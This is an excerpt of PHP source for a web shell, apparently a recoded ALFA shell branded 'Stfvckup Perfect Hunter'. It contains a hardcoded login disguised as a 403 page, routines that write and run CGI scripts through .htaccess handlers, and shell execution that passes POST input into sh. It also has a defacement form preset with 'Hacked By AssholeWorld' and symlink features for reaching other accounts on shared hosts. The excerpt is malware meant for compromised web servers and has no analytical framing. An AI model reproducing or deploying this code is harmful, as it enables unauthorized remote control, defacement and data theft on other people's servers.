...
$GLOBALS['Stfvckup'] = array(
    'username' => 'Asshole',
    'password' => '904baa8e741a4feaf5394206f7a94493',
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
$GLOBALS['DB_NAME'] = $GLOBALS['Stfvckup'];
...
define("__ALFA_DATA_FOLDER__", "Stfvckup");
...
$GLOBALS['__ALFA_COLOR__'] = array(
		...
		"main_size" => "#00c2fdff",
		"main_modify" => "#00c2fdff",
		"main_owner_group" => "#00c2fdff",
...
<title>.: Asshole Tesla :.</title><center>
<center><img style="border-radius:100px;"width="500" height="250" alt="Stfvckup Perfect Hunter" draggable="false" src="https://thoidai.org/hellohangker/badboys.png" /></center>
<div id=loginbox><p><font face="DejaVu Sans" size=-1>
<center><table cellpadding=\'2\' cellspacing=\'0\' border=\'0\' id=\'ap_table\'>
<tr><td bgcolor="gold"><table cellpadding=\'0\' cellspacing=\'0\' border=\'0\' width=\'100%\'><tr><td bgcolor="black" align=center style="padding:2;padding-bottom:4"><b><font color="white" size=-1 color="white" face="Georgia"><b>Stfvckup Perfect Hunter</b></font></th></tr>
...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	if(isset($_COOKIE["Assholecgiapi_mode"])){
		return "";
	}
	$cmd_pure = $cmd;
	...
	if($is_curl||$is_socket){
		$recreate = false;
		if(isset($_COOKIE["Assholecgiapi"])){
			if(!@file_exists("Assholecgiapi/".$_COOKIE["Assholecgiapi"].".Asshole")){
				$recreate = true;
				$lang = $_COOKIE["Assholecgiapi"];
			}
		}
		if(!isset($_COOKIE["Assholecgiapi"])||$recreate){
			...
			if($lang == "aspx"){
				...
				alfaWriteTocgiapi($lang.".Asshole",$source);
			}
			alfacgihtaccess('cgi', "Assholecgiapi/");
		}else{
			$lang = $_COOKIE["Assholecgiapi"];
		}
		$cgi_ext = ".Asshole";
		...
		$cgi_url = __ALFA_DATA_FOLDER__."/Assholecgiapi/".$lang.$cgi_ext;
		...
		if(strpos($data, "[solevisible~api]") !== false && strpos($data, '[solevisible~api]<pre>"+output+"</pre>') === false){
			if($set_cookie){
				__alfa_set_cookie("Assholecgiapi", $lang);
			}
			...
			if($set_cookie){
				__alfa_set_cookie("Assholecgiapi_mode", "off");
			}
		}
		return trim($out);
	}else{
...
echo '<html>';
echo "<title>Stfvckup Perfect Hunter Hidden Shell</title>";
...
<title>..:: '.$_SERVER['HTTP_HOST'].' ~ Stfvckup Perfect Hunter ::..</title>
<style type="text/css">';?>
...
<td width="12%" rowspan="8"><img style="border-radius:100px;" width="300" height="170" alt="lph team 2023" draggable="false" src="https://thoidai.org/hellohangker/bear.png" /></td>
</tr>
<tr>
...
function __showicon($r){
	$s['btn']='http://Asshole.lol/love/heads.png';
	$s['alfamini']='https://Asshole.lol/love/heads.png';
	$s['loader']='http://Asshole.lol/love/loader.svg';
...
if(empty($about_us)){
$about_us = "<pre><center><img src='http://Asshole.lol/love/Stfvckup-Perfect-Hunter-transformed.png'><br>
<font color='#FFFFFF'>Shell ReCoded By AssholeWorld (LPH TEAM)</font><br>
<font color='#00A220'>Contact : Asshole@Stfvckupperfecthunter.com</font><br>
...
function alfacheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["Assholecgiapi_mode"])&&!isset($_COOKIE["Assholecgiapi"])){
...
function alfaWriteTocgiapi($name, $source){
	...
	@mkdir('Assholecgiapi',0755);
	__write_file("Assholecgiapi/".$name, __get_resource($source));
	@chmod("Assholecgiapi/".$name, 0755);
	return $temp;
}
...
function alfaupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$data = alfaEx("cd '{$tmp_path}/Assholecgiapi';sh getheader.Asshole",false,true,true);
...
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='alfa-copyright'><span class='copyright'>[ AssholeGroup &copy; 2023-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='alert(\"HACKED BY AssholeWORLD\");' style='color: #E91E63;text-decoration: none;'>Contact Me at</a></span> <span style='letter-spacing: 2px;color: #00d9ffff;'>Asshole@Stfvckupperfecthunter.com</span> <span><a style='color: #ff6060;text-decoration: none;' target='_blank' href=''>@Asshole</a></span></div></td>
</tr>
</table>
</div>
...
if($dirContent === false){
	if(_alfa_can_runCommand(true,true)){
		...
		@chdir(dirname($_SERVER["SCRIPT_FILENAME"]));
		if(!isset($_COOKIE["alfachdir_bash"])||@!file_exists($tmp_getdir_path."/Assholecgiapi/getdir.alfa")){
		...
		$dirContent = alfaEx("cd ".$tmp_getdir_path."/Assholecgiapi;sh getdir.alfa '".addslashes(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd'])."'");
...
<textarea name=index rows='19' cols='103'><title>Hacked By AssholeWorld</title><b>Hacked By AssholeWorld</b></textarea><br>
<input type='submit' value=' '>
</form></center></center>";
if(isset($_POST['alfa6'])){
$s0levisible="Powered By Stfvckup Perfect Hunter";
$dbu = $_POST['alfa6'];
$path = $_POST['alfa5'];
$fname = $_POST['alfa4'];
$dbn = $_POST['alfa7'];
...
<title>Hacked By AssholeWorld</title><b>Hacked By AssholeWorld</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
if(isset($_POST['alfa6'])){
...
if(isset($_POST['alfa2'])&&($_POST['alfa2']=='symperl'||$_POST["alfa2"]=="sympy")){
	...
	if(strlen($resource) == 0){
		echo AlfaiFrameCreator('cgiAsshole/'.$cginame);
	}else{
		echo $resource;
	}
}
...
echo "<div class=header>";
echo "
<center><p><img src=\"https://thoidai.org/hellohangker/badboys.png\"></p>";
...
@chmod($name,0755);
echo '<iframe src="'.__ALFA_DATA_FOLDER__.'/cgiAsshole/'.$name.'" width="100%" height="600px" frameborder="0" style="opacity:0.9;filter: alpha(opacity=9);overflow:auto;"></iframe>';
}
}
echo $div;
alfafooter();
...
if($m=='cgi'){
$code = "#ReCoded By AssholeWorld\nOptions FollowSymLinks MultiViews Indexes ExecCGI\nAddType application/x-httpd-cgi .Asshole\nAddHandler cgi-script .Asshole";
}elseif($m=='sym'){
...
$tmp_path = alfaWriteTocgiapi("basedir.Asshole",$bash);
$bash_users  = alfaEx("cd ".$tmp_path."/Assholecgiapi;sh basedir.Asshole ".$makepwd,false,true,true);
